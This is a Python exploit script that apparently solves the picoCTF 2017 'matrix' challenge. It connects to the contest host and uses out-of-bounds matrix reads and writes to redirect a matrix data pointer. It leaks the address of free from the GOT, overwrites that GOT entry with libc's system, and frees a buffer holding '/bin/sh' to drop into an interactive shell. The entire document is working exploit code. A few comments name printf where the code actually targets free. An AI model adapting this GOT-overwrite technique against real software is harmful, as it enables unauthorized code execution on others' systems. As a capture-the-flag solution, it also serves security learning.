#!/usr/bin/python
import struct
import socket
import telnetlib

#socat TCP-LISTEN:32760,fork EXEC:./matrix 

def readuntil(f, delim='> '):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

remote = False
remote = True

def p(v):
    return struct.pack('<Q', v)

def u(v):
    return struct.unpack('<Q', v)[0]

def itof(x):
	return struct.unpack("<f", struct.pack("<I", x))[0]

def ftoi(x):
	return struct.unpack("<I", struct.pack("<f", x))[0]	

def stoi(x):
	return int(('0x' + x[::-1].encode('hex')), 16)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

if remote:
	s.connect(('shell2017.picoctf.com', 32760))
else:
	s.connect(('0', 32761))
f = s.makefile('rw', bufsize=0)

data_offset = 18

rows = 150
col = 36
rows2 = 150
col2 = 36
rows3 = 20
col3 = 20

free_got = 0x804a10c
printf_got = 0x804a108
start_main_got = 0x804a128
puts_got = 0x804a11c

if remote:
	free_offset = 0x76110
	system_offset = 0x3e3e0
else:
	free_offset = 0x712f0
	system_offset = 0x3ada0

# matrices[0] -> for overwriting matrices[1]->data
readuntil(f, "command:")
f.write("create " + str(rows) + " " + str(col) + "\n")
# matrices[1] -> for indexing GOT
readuntil(f, "command:")
f.write("create " + str(rows2) + " " + str(col2) + "\n")
# matrices[2] -> we'll free it after overwriting free()
readuntil(f, "command:")
f.write("create " + str(rows3) + " " + str(col3) + "\n")
# matrices [3] -> we'll free it to fill free@got
readuntil(f, "command:")
f.write("create " + str(rows3) + " " + str(col3) + "\n")

readuntil(f, "command")
f.write("destroy 3\n")

# fill matrices[2] with /bin/sh string
readuntil(f, "command")
f.write("set 2 0 0 %s\n" % itof(stoi("/bin")))
readuntil(f, "command")
f.write("set 2 0 1 %s\n" % itof(stoi("/sh\x00")))

# v not actually useful
readuntil(f, "command:")
p_row = col
p_col = data_offset / 4
f.write("get 0 " + str(p_row) + " " + str(p_col) + "\n")
output = readuntil(f, "E")
next_data_ptr = ftoi(float(output.split()[2]))

readuntil(f, "command:")
p_row = col
p_col = data_offset / 4
f.write("set 0 %d %d %s\n" % (p_row, p_col, itof(free_got)))

# leak printf@got
readuntil(f, "command:")
p_row = col
p_col = data_offset / 4

f.write("get 1 0 0\n")
output = readuntil(f, "E")
leaked_free = ftoi(float(output.split()[2]))
print 'free_addr: %x' % leaked_free

# overwrite printf@got with system
system = leaked_free - free_offset + system_offset
readuntil(f, "command:")
f.write("set 1 0 0 %s\n" % itof(system))

# call overwritten free()
readuntil(f, "command:")
f.write("destroy 2\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
